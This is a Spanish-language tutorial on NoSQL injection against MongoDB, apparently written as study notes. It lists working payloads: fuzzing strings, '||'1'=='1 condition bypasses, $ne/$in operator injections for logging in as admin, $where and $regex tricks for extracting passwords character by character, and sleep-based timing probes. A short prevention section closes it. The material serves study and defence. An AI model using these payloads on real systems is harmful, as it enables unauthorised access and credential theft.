# NoSQL Injection

La **inyección NoSQL** es una vulnerabilidad que permite a un atacante interferir con las consultas que una aplicación realiza a una base de datos NoSQL. Esto puede permitir:

- Bypassear autenticación o mecanismos de protección.
- Extraer o modificar datos.
- Provocar una denegación de servicio (DoS).
- Ejecutar código en el servidor.

Las bases de datos NoSQL almacenan y recuperan datos en formatos distintos a las tablas relacionales tradicionales de SQL. Utilizan múltiples lenguajes de consulta en lugar de un estándar único, y suelen tener menos restricciones relacionales.

---

## Tipos de Inyección NoSQL

Existen dos tipos principales:

### 1. Syntax Injection
Ocurre cuando el atacante rompe la sintaxis de la consulta NoSQL e inyecta su propio payload.

- Similar a SQL Injection.
- Varía según el lenguaje y estructura de la base de datos.

### 2. Operator Injection
Ocurre cuando se manipulan operadores propios de NoSQL para alterar la lógica de la consulta.

---

## Detección de Inyección NoSQL

Se puede detectar intentando romper la sintaxis mediante:

- **Fuzzing**
- Caracteres especiales
- Inputs maliciosos

Si la aplicación no sanitiza correctamente, puede generar:

- Errores en la base de datos
- Cambios en la respuesta

---

## Ejemplo en MongoDB

Aplicación vulnerable:


https://insecure-website.com/product/lookup?category=fizzy


Consulta interna:

```js
this.category == 'fizzy'
```
Fuzzing

Payload de prueba:
```
'"`{
;$Foo}
$Foo \xYZ
```
URL codificada:
```
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```
Si la respuesta cambia → posible vulnerabilidad.

### Identificación de caracteres vulnerables

Ejemplo:
```
this.category == '''
```
Si rompe la query → ' es vulnerable.

Validación:
```
this.category == '\''
```
### Manipulación de condiciones booleanas

Prueba:
```
' && 0 && 'x
' && 1 && 'x
```
Si hay diferencia en respuestas → la lógica del backend fue alterada.

### Bypass de condiciones

Payload:
```
'||'1'=='1
```
Resultado:
```
this.category == 'fizzy'||'1'=='1'
```
→ Devuelve todos los resultados.

⚠️ Advertencia: Puede causar pérdida de datos si afecta operaciones de escritura.

### Uso de Null Byte

Payload:
```
fizzy'%00
```
Consulta:
```
this.category == 'fizzy'\u0000' && this.released == 1
```
→ Ignora condiciones posteriores.

### Inyección de Operadores NoSQL

Operadores comunes en MongoDB:
```
$where
$ne
$in
$regex
```
### Ejemplo de Operator Injection

Entrada original:
```
{"username":"wiener","password":"peter"}
```
Payload:
```
{"username":{"$ne":"invalid"},"password":"peter"}
```
Bypass completo:
```
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```
Acceso dirigido
```
{"username":{"$in":["admin","administrator"]},"password":{"$ne":""}}
```
### Extracción de datos con JavaScript
Si se usa $where:
```
{"$where":"this.username == 'admin'"}
```
Payload:
```
admin' && this.password[0] == 'a' || 'a'=='b
```
→ Permite extraer la contraseña carácter por carácter.

### Uso de Regex
```
{"username":"admin","password":{"$regex":"^a*"}}
```
→ Verifica si la contraseña empieza con "a".

## Enumeración de campos
```
Object.keys(this)[0]
```
Payload:
```
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```
→ Extrae nombres de campos.

### Timing-Based Injection

Payload:
```
{"$where": "sleep(5000)"}
```
→ Retraso indica ejecución de código.

Ejemplo avanzado:
```
if(x.password[0]==="a"){sleep(5000)}
```
## Prevención

Buenas prácticas:

Validar y sanitizar inputs (allowlist).
Usar consultas parametrizadas.
Evitar concatenación directa.
Restringir operadores permitidos.
